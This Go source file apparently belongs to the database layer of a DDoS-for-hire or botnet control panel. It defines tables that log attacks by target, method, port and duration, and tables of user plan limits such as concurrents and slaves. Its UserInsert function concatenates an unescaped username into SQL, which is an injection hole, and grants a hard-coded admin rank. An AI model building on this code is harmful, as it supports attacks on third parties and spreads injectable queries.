package database

import (
	"strconv"
	"time"
)

//access the user table formula properly
//this will return the string with the formula written on
func (d *Connection) User() string { //returns the table properly
	return "CREATE TABLE `users` (`identity`      int(10) unsigned NOT NULL AUTO_INCREMENT,`username`      varchar(64) DEFAULT NULL,`password`      varchar(128) DEFAULT NULL,`ranks`         varchar(4096) DEFAULT NULL,`maxtime`       int(10) unsigned DEFAULT 300,`cooldown`      int(10) unsigned DEFAULT 30,`concurrents`   int(10) unsigned DEFAULT 3,`maxsessions`   int(10) unsigned DEFAULT 3,`newuser`       tinyint(1) DEFAULT 0,`theme`         varchar(128) DEFAULT 'default',`expiry`        bigint(20) DEFAULT NULL,`parent`        int(10) unsigned DEFAULT 1,`created`       bigint(20) DEFAULT 0,`updated`       bigint(20) DEFAULT 0,`max_slaves`    int(10) unsigned DEFAULT 0,`mfa`           varchar(200) DEFAULT '',`locked`        tinyint(1) DEFAULT 0,`plan`          varchar(64) DEFAULT 'not',`token`         varchar(128) DEFAULT '',`address`       varchar(128) DEFAULT '',PRIMARY KEY (`identity`),KEY `User` (`username`));"
}

//access the attacks table formula properly
//this will return the string with the formula written on
func (d *Connection) Attacks() string { //returns the table properly
	return "CREATE TABLE `attacks` (`id` int(10) unsigned NOT NULL AUTO_INCREMENT,`target` varchar(128) DEFAULT NULL,`username` varchar(64) DEFAULT NULL,`method` varchar(64) DEFAULT NULL,`duration` int(10) unsigned DEFAULT NULL,`port` int(10) unsigned DEFAULT NULL,`created` bigint(20) DEFAULT NULL,`finish` bigint(20) DEFAULT NULL,`api` tinyint(1) DEFAULT 0,PRIMARY KEY (`id`),KEY `User` (`username`));"
}


//access the logins table formula properly
//this will return the string with the formula written on
func (d *Connection) Logins() string { //returns the table properly
	return "CREATE TABLE `logins` (`addressIPv4` varchar(128) DEFAULT NULL,`timeDate` bigint(20) DEFAULT NULL,`sshBanner` varchar(128) DEFAULT NULL,`username` varchar(64) DEFAULT NULL,`status` tinyint(1) DEFAULT NULL);"
}

//access the tokens table formula properly
//this will return the string with the formula written on
func (d *Connection) Tokens() string { //returns the table properly
	return "CREATE TABLE `tokens` (`token` varchar(128) DEFAULT NULL,`bundle` varchar(1024) DEFAULT NULL);"
}

//access the user table formula properly
//this will return the string with the formula written on
func (d *Connection) UserInsert(username, password, api string) string { //returns the table properly
	return "INSERT INTO `users` (`identity`, `username`, `password`, `ranks`, `maxtime`, `cooldown`, `concurrents`, `maxsessions`, `newuser`, `expiry`, `theme`, `created`, `updated`, `plan`, `token`) VALUES (NULL, '"+username+"', '"+HashProduct(password)+"', 'eyJ1c2VybmFtZSI6InJvb3QiLCJyYW5rcyI6W3sibmFtZSI6ImFkbWluIiwic3RhdHVzIjp0cnVlfV19', 300, 15, 4, 2, 1, "+strconv.Itoa(int(time.Now().Add(1 * time.Hour * 8760).Unix()))+", 'default', "+strconv.Itoa(int(time.Now().Unix()))+", "+strconv.Itoa(int(time.Now().Unix()))+", 'no', '"+HashProduct(api)+"');"
}